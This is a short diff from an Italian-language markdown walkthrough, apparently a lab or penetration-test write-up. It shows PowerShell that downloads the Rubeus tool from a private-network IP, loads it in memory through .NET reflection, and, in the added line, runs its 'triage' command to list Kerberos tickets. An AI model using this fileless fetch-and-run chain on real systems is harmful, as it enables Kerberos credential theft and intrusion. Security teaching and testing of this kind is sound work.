@@ -14,5 +14,5 @@ Poi avviamo Rubeus sulla macchina
 ```Powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/rubeus.exe')
 $assem = [System.Reflection.Assembly]::Load($data);
-
+[Rubeus.Program]::MainString("triage");
 ```
